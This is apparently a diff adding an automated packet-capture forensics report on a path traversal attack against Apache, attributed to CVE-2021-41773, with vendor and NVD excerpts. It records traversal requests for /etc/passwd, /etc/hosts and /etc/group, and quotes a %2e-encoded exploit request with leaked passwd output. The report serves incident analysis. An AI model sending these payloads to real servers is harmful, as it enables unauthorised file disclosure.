+Summary: UNTRUSTED WEB RESEARCH (not PCAP evidence). Address the critical vulnerabilities in Apache HTTP Server (CVE-2021-41773 & CVE-2021-42013) that enable path traversal and remote code ... | Webpage text: About CVE-2021-41773 About CVE-2021-42013 Detecting the Vulnerabilities with Qualys WAS On October 4, 2021, Apache HTTP Server Project released Security advisory on a Path traversal and File disclosure vulnerability in Apache HTTP Server 2.4.49 and 2.4.50 tracked as CVE-2021-41773 and CVE-2021-42013. In the advisory, Apache also highlighted “the issue is known to be exploited in the wild” and later it was identified that the vulnerability can be abused to perform remote code execution. For exploiting bo Get Full Access to the Qualys Cloud Platform Free As the vulnerabilities are configuration dependent, checking the version of Apache web server is not enough to identify vulnerable servers. With both the CVEs being actively exploited, Qualys Web Application Scanning has released QID 150372, 150373, 150374 which sends specially crafted HTTP request to the target server to determine if it is exploitable. Once successfully detected, users can remediate the vulnerabilit About CVE-2021-41773 According to CVE-2021-41773, Apache HTTP Server 2.4.49 is vulnerable to Path Traversal and Remote Code execution attacks. The path traversal vulnerability was introduced due to the new code change added for path normalization i.e., for URL paths to remove unwanted or dangerous parts from the pathname, but it was inadequate to detect different techniques of encoding the path traversal characters “dot-dot-slash (../)” To prevent path traversal attacks, the normalization function which is responsible to resolve URL-encoded values from the requested URI, resolved Unicode values one at a time. Hence when URL encoding the second dot as %2e, the logic fails to recognize %2e as dot thereby not decoding it, this converts the characters ../ to .%2e/ and bypasses the check. Along with Path traversal check bypass, for an Apache HTTP server to be vulnerable, the HTTP Server configuration should either contain the directory directive for entire server’s filesystem as Require all granted or the directory directive should be completely missing from the configuration file. Vulnerable Configuration: Therefore, bypassing the dot-dot check as .%2e and chaining it with misconfigured directory directive allows an attacker to read arbitrary files such as passwd from the vulnerable server file system. Exploitation: Path Traversal GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Date: Mon, 18 Oct 2021 08:13:02 GMT Server: Apache/2.4.49 (Unix) Last-Modified: Mon, 27 Sep 2021 00:00:00 GMT ETag: "39e-5cceec7356000" root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/u
+Supports: None
+Contradicts: None
+
+Source 6: Serper web result
+Title: Apache 2.4.49 < 2.4.51 Path Traversal Vulnerability
+URL: https://www.tenable.com/plugins/nessus/153952
+Summary: UNTRUSTED WEB RESEARCH (not PCAP evidence). The remote web server. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like ... | Webpage text: Tenable OT Security Families Tenable Cloud Security Families Tenable Self-Hosted Container Security Families Tenable Community & Support Tenable OT Security Families Tenable Cloud Security Families Tenable Self-Hosted Container Security Families Apache 2.4.49 < 2.4.51 Path Traversal Vulnerability critical Nessus Plugin ID 153952 SynopsisThe remote web server is affected by a vulnerability. DescriptionThe version of Apache httpd installed on the remote host is 2.4.49 prior to 2.4.51. It is, therefore, affected by a vulnerability as referenced in the 2.4.51 advisory. - It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. (CVE-2021-42013) Note that Nessus has not tested for this issue but has instead relied only on the application's self-reported version number. SolutionUpgrade to Apache version 2.4.51 or later. https://httpd.apache.org/security/vulnerabilities_24.html File Name: apache_2_4_51.nasl Agent: windows, macosx, unix Configuration: Enable thorough checks (optional) Supported Sensors: Frictionless Assessment AWS, Frictionless Assessment Azure, Frictionless Assessment Agent, Nessus Agent, Tenable Cloud Security, Tenable Self-Hosted Container Security, Nessus Vector: CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P CVSS Score Source: CVE-2021-42013 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Temporal Vector: CVSS:3.0/E:F/RL:O/RC:C Vulnerability Information CPE: cpe:/a:apache:http_server, cpe:/a:apache:httpd Required KB Items: installed_sw/Apache Exploit Ease: Exploits are available Patch Publication Date: 10/7/2021 Vulnerability Publication Date: 10/7/2021 CISA Known Exploited Vulnerability Due Dates: 11/17/2021 Metasploit (Apache 2.4.49/2.4.50 Traversal RCE) Elliot (Apache 2.4.50 RCE) CVE: CVE-2021-42013
+Supports: None
+Contradicts: None
+
+Source 7: Serper web result
+Title: CVE Record: CVE-2021-41773
+URL: https://www.cve.org/CVERecord?id=CVE-2021-41773
+Summary: UNTRUSTED WEB RESEARCH (not PCAP evidence). A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs ... | Webpage text: Common vulnerabilities and Exposures (CVE)
+Supports: None
+Contradicts: None
+
+Source 8: Serper web result
+Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote ...
+URL: https://www.exploit-db.com/exploits/50383
+Summary: UNTRUSTED WEB RESEARCH (not PCAP evidence). Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE). CVE-2021-41773 . webapps exploit for Multiple platform.
+Supports: None
+Contradicts: None
+Warnings: Webpage read unavailable for www.exploit-db.com: URLError: <urlopen error [WinError 10054] An existing connection was forcibly closed by the remote host>
+
+=== CVE MECHANISM CANDIDATES (NOT CONFIRMED CVEs) ===
+Rank 1: CVE-2007-5461 — Preliminary mechanism overlap (CANDIDATE ONLY)
+Matched packet mechanisms: path_traversal
+CVE advisory mechanism: Mechanism keywords overlap a CVE-specific authoritative description; exact prerequisites unverified.
+Packet evidence IDs: E-S0000-F000007-004, E-S0000-F000007-013, E-S0001-F000017-004, E-S0001-F000017-009, E-S0002-F000027-004, E-S0002-F000027-008, E-S0003-F000037-004, E-S0003-F000037-008, E-S0004-F000047-004, E-S0004-F000047-009, E-S0005-F000057-004, E-S0005-F000057-010, E-S0006-F000067-004, E-S0006-F000067-010, E-S0007-F000077-004, E-S0007-F000077-009, E-S0008-F000087-004, E-S0008-F000087-009, E-S0009-F000097-004, E-S0009-F000097-009, E-S0010-F000107-004, E-S0010-F000107-010
+Advisory: https://nvd.nist.gov/vuln/detail/CVE-2007-5461
+Unconfirmed requirements: Affected product version and CVE-specific prerequisites not independently established; A packet header and advisory overlap alone cannot prove the server product or exact CVE
+Rank 2: CVE-2020-36939 — Preliminary mechanism overlap (CANDIDATE ONLY)
+Matched packet mechanisms: path_traversal
+CVE advisory mechanism: Mechanism keywords overlap a CVE-specific authoritative description; exact prerequisites unverified.
+Packet evidence IDs: E-S0000-F000007-004, E-S0000-F000007-013, E-S0001-F000017-004, E-S0001-F000017-009, E-S0002-F000027-004, E-S0002-F000027-008, E-S0003-F000037-004, E-S0003-F000037-008, E-S0004-F000047-004, E-S0004-F000047-009, E-S0005-F000057-004, E-S0005-F000057-010, E-S0006-F000067-004, E-S0006-F000067-010, E-S0007-F000077-004, E-S0007-F000077-009, E-S0008-F000087-004, E-S0008-F000087-009, E-S0009-F000097-004, E-S0009-F000097-009, E-S0010-F000107-004, E-S0010-F000107-010
+Advisory: https://nvd.nist.gov/vuln/detail/CVE-2020-36939
+Unconfirmed requirements: Affected product version and CVE-specific prerequisites not independently established; A packet header and advisory overlap alone cannot prove the server product or exact CVE
+Rank 3: CVE-2021-41773 — Preliminary mechanism overlap (CANDIDATE ONLY)
+Matched packet mechanisms: path_traversal
+CVE advisory mechanism: Mechanism keywords overlap a CVE-specific authoritative description; exact prerequisites unverified.
+Packet evidence IDs: E-S0000-F000007-004, E-S0000-F000007-013, E-S0001-F000017-004, E-S0001-F000017-009, E-S0002-F000027-004, E-S0002-F000027-008, E-S0003-F000037-004, E-S0003-F000037-008, E-S0004-F000047-004, E-S0004-F000047-009, E-S0005-F000057-004, E-S0005-F000057-010, E-S0006-F000067-004, E-S0006-F000067-010, E-S0007-F000077-004, E-S0007-F000077-009, E-S0008-F000087-004, E-S0008-F000087-009, E-S0009-F000097-004, E-S0009-F000097-009, E-S0010-F000107-004, E-S0010-F000107-010
+Advisory: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+Unconfirmed requirements: Affected product version and CVE-specific prerequisites not independently established; A packet header and advisory overlap alone cannot prove the server product or exact CVE
+Do NOT equate this ranking with verified CVE exploitation or exact CVE attribution.
+
+=== FORMATTED EVIDENCE ===
+=== PRIMARY PCAP EVIDENCE ===
+- PCAP [E-S0000-F000007-004]: GET /icons/../../../../etc/passwd.
+- PCAP [E-S0000-F000009-007]: HTTP Status 200.
+- PCAP [E-S0000-F000009-012]: Server response contains Unix passwd-format root account entry (possible file disclosure; correlate with request).
+- PCAP [E-S0002-F000027-004]: GET /icons/../../../../etc/hosts.
+- PCAP [E-S0002-F000029-007]: HTTP Status 200.
+- PCAP [E-S0003-F000037-004]: GET /icons/../../../../etc/hostname.
+- PCAP [E-S0003-F000039-007]: HTTP Status 200.
+- PCAP [E-S0004-F000047-004]: GET /icons/../../../../etc/group.
+- PCAP [E-S0004-F000049-007]: HTTP Status 200.
+
+=== EXTERNAL ONLINE SUPPORTING EVIDENCE ===
+- ONLINE [CISA KEV] Apache HTTP Server Path Traversal Vulnerability: Apache HTTP Server: Apache HTTP Server contains a path traversal vulnerability that allows an attacker to perform remote code execution if files outside directories configured by Alias-like directives are not under default �require all denied� or if CGI scripts are enabled. The original patch issued under this CVE ID is insufficient, please review remediation information under CVE-2021-42013. Required action: Apply updates per vendor instructions. Source: https://www.cisa.gov/known-exploited-vulnerabilities-catalog Supports: CISA KEV identifies CVE-2021-41773 as exploited in the wild.
+- ONLINE RESEARCH LEAD [NIST NVD] CVE-2020-36939: NVD vulnerability record: Cassandra Web 0.5.0 contains a directory traversal vulnerability that allows unauthenticated attackers to read arbitrary files by manipulating path traversal parameters. Attackers can exploit the disabled Rack::Protection module to read sensitive system files like /etc/passwd and retrieve Apache Cassandra database credentials. Source: https://nvd.nist.gov/vuln/detail/CVE-2020-36939 Supports: NVD lists CVE-2020-36939 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE [NIST NVD] CVE-2021-41773: NVD vulnerability record: A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. The fix in Apache HTTP Server 2.4.50 was found to be incomplete, see CVE-2021-42013. Source: https://nvd.nist.gov/vuln/detail/CVE-2021-41773 Supports: NVD lists CVE-2021-41773 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE RESEARCH LEAD [NIST NVD] CVE-2007-5461: NVD vulnerability record: Absolute path traversal vulnerability in Apache Tomcat 4.0.0 through 4.0.6, 4.1.0, 5.0.0, 5.5.0 through 5.5.25, and 6.0.0 through 6.0.14, under certain configurations, allows remote authenticated users to read arbitrary files via a WebDAV write request that specifies an entity with a SYSTEM tag. Source: https://nvd.nist.gov/vuln/detail/CVE-2007-5461 Supports: NVD lists CVE-2007-5461 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE [Serper web result] CVE-2021-41773: Path Traversal & RCE in Apache HTTP ...: UNTRUSTED WEB RESEARCH (not PCAP evidence). Address the critical vulnerabilities in Apache HTTP Server (CVE-2021-41773 & CVE-2021-42013) that enable path traversal and remote code ... | Webpage text: About CVE-2021-41773 About CVE-2021-42013 Detecting the Vulnerabilities with Qualys WAS On October 4, 2021, Apache HTTP Server Project released Security advisory on a Path traversal and File disclosure vulnerability in Apache HTTP Server 2.4.49 and 2.4.50 tracked as CVE-2021-41773 and CVE-2021-42013. In the advisory, Apache also highlighted “the issue is known to be exploited in the wild” and later it was identified that the vulnerability can be abused to perform remote code execution. For exploiting bo Get Full Access to the Qualys Cloud Platform Free As the vulnerabilities are configuration dependent, checking the version of Apache web server is not enough to identify vulnerable servers. With both the CVEs being actively exploited, Qualys Web Application Scanning has released QID 150372, 150373, 150374 which sends specially crafted HTTP request to the target server to determine if it is exploitable. Once successfully detected, users can remediate the vulnerabilit About CVE-2021-41773 According to CVE-2021-41773, Apache HTTP Server 2.4.49 is vulnerable to Path Traversal and Remote Code execution attacks. The path traversal vulnerability was introduced due to the new code change added for path normalization i.e., for URL paths to remove unwanted or dangerous parts from the pathname, but it was inadequate to detect different techniques of encoding the path traversal characters “dot-dot-slash (../)” To prevent path traversal attacks, the normalization function which is responsible to resolve URL-encoded values from the requested URI, resolved Unicode values one at a time. Hence when URL encoding the second dot as %2e, the logic fails to recognize %2e as dot thereby not decoding it, this converts the characters ../ to .%2e/ and bypasses the check. Along with Path traversal check bypass, for an Apache HTTP server to be vulnerable, the HTTP Server configuration should either contain the directory directive for entire server’s filesystem as Require all granted or the directory directive should be completely missing from the configuration file. Vulnerable Configuration: Therefore, bypassing the dot-dot check as .%2e and chaining it with misconfigured directory directive allows an attacker to read arbitrary files such as passwd from the vulnerable server file system. Exploitation: Path Traversal GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Date: Mon, 18 Oct 2021 08:13:02 GMT Server: Apache/2.4.49 (Unix) Last-Modified: Mon, 27 Sep 2021 00:00:00 GMT ETag: "39e-5cceec7356000" root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/u Source: https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
+- ONLINE [Serper web result] Apache 2.4.49 < 2.4.51 Path Traversal Vulnerability: UNTRUSTED WEB RESEARCH (not PCAP evidence). The remote web server. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like ... | Webpage text: Tenable OT Security Families Tenable Cloud Security Families Tenable Self-Hosted Container Security Families Tenable Community & Support Tenable OT Security Families Tenable Cloud Security Families Tenable Self-Hosted Container Security Families Apache 2.4.49 < 2.4.51 Path Traversal Vulnerability critical Nessus Plugin ID 153952 SynopsisThe remote web server is affected by a vulnerability. DescriptionThe version of Apache httpd installed on the remote host is 2.4.49 prior to 2.4.51. It is, therefore, affected by a vulnerability as referenced in the 2.4.51 advisory. - It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. (CVE-2021-42013) Note that Nessus has not tested for this issue but has instead relied only on the application's self-reported version number. SolutionUpgrade to Apache version 2.4.51 or later. https://httpd.apache.org/security/vulnerabilities_24.html File Name: apache_2_4_51.nasl Agent: windows, macosx, unix Configuration: Enable thorough checks (optional) Supported Sensors: Frictionless Assessment AWS, Frictionless Assessment Azure, Frictionless Assessment Agent, Nessus Agent, Tenable Cloud Security, Tenable Self-Hosted Container Security, Nessus Vector: CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P CVSS Score Source: CVE-2021-42013 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Temporal Vector: CVSS:3.0/E:F/RL:O/RC:C Vulnerability Information CPE: cpe:/a:apache:http_server, cpe:/a:apache:httpd Required KB Items: installed_sw/Apache Exploit Ease: Exploits are available Patch Publication Date: 10/7/2021 Vulnerability Publication Date: 10/7/2021 CISA Known Exploited Vulnerability Due Dates: 11/17/2021 Metasploit (Apache 2.4.49/2.4.50 Traversal RCE) Elliot (Apache 2.4.50 RCE) CVE: CVE-2021-42013 Source: https://www.tenable.com/plugins/nessus/153952
+- ONLINE [Serper web result] CVE Record: CVE-2021-41773: UNTRUSTED WEB RESEARCH (not PCAP evidence). A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs ... | Webpage text: Common vulnerabilities and Exposures (CVE) Source: https://www.cve.org/CVERecord?id=CVE-2021-41773
+- ONLINE [Serper web result] Apache HTTP Server 2.4.49 - Path Traversal & Remote ...: UNTRUSTED WEB RESEARCH (not PCAP evidence). Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE). CVE-2021-41773 . webapps exploit for Multiple platform. Source: https://www.exploit-db.com/exploits/50383
+
+=== SOURCE URLS ===
+- https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+- https://nvd.nist.gov/vuln/detail/CVE-2020-36939
+- https://nvd.nist.gov/vuln/detail/CVE-2021-41773
+- https://nvd.nist.gov/vuln/detail/CVE-2007-5461
+- https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
+- https://www.tenable.com/plugins/nessus/153952
+- https://www.cve.org/CVERecord?id=CVE-2021-41773
+- https://www.exploit-db.com/exploits/50383
+
+Search status: Valid
+Search query: Apache 2.4.49 path traversal vulnerability packet clues: endpoint icons etc passwd; endpoint icons etc shadow; endpoint icons etc hosts; endpoint icons etc hostname
+Limitations:
+- Online sources are supporting context; packet evidence remains primary.
+- The Analyzer and Verifier findings were retained without rewriting.
+- Webpage read unavailable for www.exploit-db.com: URLError: <urlopen error [WinError 10054] An existing connection was forcibly closed by the remote host>
+- 2 online CVE record(s) were retained as product-related research leads only; they were not used as the validated CVE.
+
+=== ANALYST-VERIFIER CVE STATUS (NO SEPARATE VALIDATOR) ===
+{
+  "status": "Valid",
+  "validated_cve": "CVE-2021-41773",
+  "cve_supported": "Yes",
+  "confidence": "High",
+  "reasons": [
+    "Analyst proposed CVE-2021-41773; independent Verifier CVE support: Yes. No separate online CVE validator was run."
+  ]
+}
+
+=== FINAL REPORT ===
+Affected Service: Apache
+Associated CVE candidate (Analyst): CVE-2021-41773
+Associated CVE mechanism match (binary): No
+Exact CVE applicability established: No
+Attack prediction confidence: High
+Attack outcome evidence-verified: Yes
+Identified CVE: CVE-2021-41773
+Attack: Successful
+Is Service Vulnerable: Yes
+Evidence:
+- PCAP [E-S0000-F000007-004]: GET /icons/../../../../etc/passwd.
+- PCAP [E-S0000-F000009-007]: HTTP Status 200.
+- PCAP [E-S0000-F000009-012]: Server response contains Unix passwd-format root account entry (possible file disclosure; correlate with request).
+- PCAP [E-S0002-F000027-004]: GET /icons/../../../../etc/hosts.
+- PCAP [E-S0002-F000029-007]: HTTP Status 200.
+- PCAP [E-S0003-F000037-004]: GET /icons/../../../../etc/hostname.
+- PCAP [E-S0003-F000039-007]: HTTP Status 200.
+- PCAP [E-S0004-F000047-004]: GET /icons/../../../../etc/group.
+- PCAP [E-S0004-F000049-007]: HTTP Status 200.
+- ONLINE [CISA KEV] Apache HTTP Server Path Traversal Vulnerability: Apache HTTP Server: Apache HTTP Server contains a path traversal vulnerability that allows an attacker to perform remote code execution if files outside directories configured by Alias-like directives are not under default �require all denied� or if CGI scripts are enabled. The original patch issued under this CVE ID is insufficient, please review remediation information under CVE-2021-42013. Required action: Apply updates per vendor instructions. Source: https://www.cisa.gov/known-exploited-vulnerabilities-catalog Supports: CISA KEV identifies CVE-2021-41773 as exploited in the wild.
+- ONLINE RESEARCH LEAD [NIST NVD] CVE-2020-36939: NVD vulnerability record: Cassandra Web 0.5.0 contains a directory traversal vulnerability that allows unauthenticated attackers to read arbitrary files by manipulating path traversal parameters. Attackers can exploit the disabled Rack::Protection module to read sensitive system files like /etc/passwd and retrieve Apache Cassandra database credentials. Source: https://nvd.nist.gov/vuln/detail/CVE-2020-36939 Supports: NVD lists CVE-2020-36939 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE [NIST NVD] CVE-2021-41773: NVD vulnerability record: A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions. The fix in Apache HTTP Server 2.4.50 was found to be incomplete, see CVE-2021-42013. Source: https://nvd.nist.gov/vuln/detail/CVE-2021-41773 Supports: NVD lists CVE-2021-41773 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE RESEARCH LEAD [NIST NVD] CVE-2007-5461: NVD vulnerability record: Absolute path traversal vulnerability in Apache Tomcat 4.0.0 through 4.0.6, 4.1.0, 5.0.0, 5.5.0 through 5.5.25, and 6.0.0 through 6.0.14, under certain configurations, allows remote authenticated users to read arbitrary files via a WebDAV write request that specifies an entity with a SYSTEM tag. Source: https://nvd.nist.gov/vuln/detail/CVE-2007-5461 Supports: NVD lists CVE-2007-5461 as a research lead; product identity, version applicability, and exploitation remain unverified.
+- ONLINE [Serper web result] CVE-2021-41773: Path Traversal & RCE in Apache HTTP ...: UNTRUSTED WEB RESEARCH (not PCAP evidence). Address the critical vulnerabilities in Apache HTTP Server (CVE-2021-41773 & CVE-2021-42013) that enable path traversal and remote code ... | Webpage text: About CVE-2021-41773 About CVE-2021-42013 Detecting the Vulnerabilities with Qualys WAS On October 4, 2021, Apache HTTP Server Project released Security advisory on a Path traversal and File disclosure vulnerability in Apache HTTP Server 2.4.49 and 2.4.50 tracked as CVE-2021-41773 and CVE-2021-42013. In the advisory, Apache also highlighted “the issue is known to be exploited in the wild” and later it was identified that the vulnerability can be abused to perform remote code execution. For exploiting bo Get Full Access to the Qualys Cloud Platform Free As the vulnerabilities are configuration dependent, checking the version of Apache web server is not enough to identify vulnerable servers. With both the CVEs being actively exploited, Qualys Web Application Scanning has released QID 150372, 150373, 150374 which sends specially crafted HTTP request to the target server to determine if it is exploitable. Once successfully detected, users can remediate the vulnerabilit About CVE-2021-41773 According to CVE-2021-41773, Apache HTTP Server 2.4.49 is vulnerable to Path Traversal and Remote Code execution attacks. The path traversal vulnerability was introduced due to the new code change added for path normalization i.e., for URL paths to remove unwanted or dangerous parts from the pathname, but it was inadequate to detect different techniques of encoding the path traversal characters “dot-dot-slash (../)” To prevent path traversal attacks, the normalization function which is responsible to resolve URL-encoded values from the requested URI, resolved Unicode values one at a time. Hence when URL encoding the second dot as %2e, the logic fails to recognize %2e as dot thereby not decoding it, this converts the characters ../ to .%2e/ and bypasses the check. Along with Path traversal check bypass, for an Apache HTTP server to be vulnerable, the HTTP Server configuration should either contain the directory directive for entire server’s filesystem as Require all granted or the directory directive should be completely missing from the configuration file. Vulnerable Configuration: Therefore, bypassing the dot-dot check as .%2e and chaining it with misconfigured directory directive allows an attacker to read arbitrary files such as passwd from the vulnerable server file system. Exploitation: Path Traversal GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Date: Mon, 18 Oct 2021 08:13:02 GMT Server: Apache/2.4.49 (Unix) Last-Modified: Mon, 27 Sep 2021 00:00:00 GMT ETag: "39e-5cceec7356000" root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/u Source: https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
+- ONLINE [Serper web result] Apache 2.4.49 < 2.4.51 Path Traversal Vulnerability: UNTRUSTED WEB RESEARCH (not PCAP evidence). The remote web server. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like ... | Webpage text: Tenable OT Security Families Tenable Cloud Security Families Tenable Self-Hosted Container Security Families Tenable Community & Support Tenable OT Security Families Tenable Cloud Security Families Tenable Self-Hosted Container Security Families Apache 2.4.49 < 2.4.51 Path Traversal Vulnerability critical Nessus Plugin ID 153952 SynopsisThe remote web server is affected by a vulnerability. DescriptionThe version of Apache httpd installed on the remote host is 2.4.49 prior to 2.4.51. It is, therefore, affected by a vulnerability as referenced in the 2.4.51 advisory. - It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. (CVE-2021-42013) Note that Nessus has not tested for this issue but has instead relied only on the application's self-reported version number. SolutionUpgrade to Apache version 2.4.51 or later. https://httpd.apache.org/security/vulnerabilities_24.html File Name: apache_2_4_51.nasl Agent: windows, macosx, unix Configuration: Enable thorough checks (optional) Supported Sensors: Frictionless Assessment AWS, Frictionless Assessment Azure, Frictionless Assessment Agent, Nessus Agent, Tenable Cloud Security, Tenable Self-Hosted Container Security, Nessus Vector: CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P CVSS Score Source: CVE-2021-42013 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Temporal Vector: CVSS:3.0/E:F/RL:O/RC:C Vulnerability Information CPE: cpe:/a:apache:http_server, cpe:/a:apache:httpd Required KB Items: installed_sw/Apache Exploit Ease: Exploits are available Patch Publication Date: 10/7/2021 Vulnerability Publication Date: 10/7/2021 CISA Known Exploited Vulnerability Due Dates: 11/17/2021 Metasploit (Apache 2.4.49/2.4.50 Traversal RCE) Elliot (Apache 2.4.50 RCE) CVE: CVE-2021-42013 Source: https://www.tenable.com/plugins/nessus/153952
+- ONLINE [Serper web result] CVE Record: CVE-2021-41773: UNTRUSTED WEB RESEARCH (not PCAP evidence). A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs ... | Webpage text: Common vulnerabilities and Exposures (CVE) Source: https://www.cve.org/CVERecord?id=CVE-2021-41773
+- ONLINE [Serper web result] Apache HTTP Server 2.4.49 - Path Traversal & Remote ...: UNTRUSTED WEB RESEARCH (not PCAP evidence). Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE). CVE-2021-41773 . webapps exploit for Multiple platform. Source: https://www.exploit-db.com/exploits/50383
+
+Verification Summary:
+- Affected service: Apache.
+- Attack type: Path Traversal.
+- Attack technique: File Disclosure.
+- Service supported by Verifier: Yes.
+- Attack supported by Verifier: Yes.
+- Attack success supported by Verifier: Yes.
+- Verification result: Supported.
+- Verifier confidence: High.
+- Consensus confidence: High.
+- Consensus score: 5/5.
+- Consensus attack outcome: Success.
+- Validated CVE: CVE-2021-41773.
+- CVE assessment: Analyst proposed CVE-2021-41773; independent Verifier CVE support: Yes. No separate online CVE validator was run.
+- Binary associated-CVE mechanism match: No.
+- Exact CVE applicability established: No.
+- Binary attack prediction: Success (High confidence).
+- Attack prediction supported by prior Consensus: Yes.
+- Binary decision limitation: CVE mechanism match is not established; No means not supported, not disproven.
+- Binary decision limitation: Exact affected-version/configuration applicability has not been established; No does not mean patched or safe.
+- MCP evidence search status: Valid.
+- MCP investigation query: Apache 2.4.49 path traversal vulnerability packet clues: endpoint icons etc passwd; endpoint icons etc shadow; endpoint icons etc hosts; endpoint icons etc hostname.
+- Online results were used as supporting context and did not replace packet evidence or Verifier findings.
+- Evidence-source URL: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+- Evidence-source URL: https://nvd.nist.gov/vuln/detail/CVE-2020-36939
+- Evidence-source URL: https://nvd.nist.gov/vuln/detail/CVE-2021-41773
+- Evidence-source URL: https://nvd.nist.gov/vuln/detail/CVE-2007-5461
+- Evidence-source URL: https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
+- Evidence-source URL: https://www.tenable.com/plugins/nessus/153952
+- Evidence-source URL: https://www.cve.org/CVERecord?id=CVE-2021-41773
+- Evidence-source URL: https://www.exploit-db.com/exploits/50383
+- Evidence limitation: Online sources are supporting context; packet evidence remains primary.
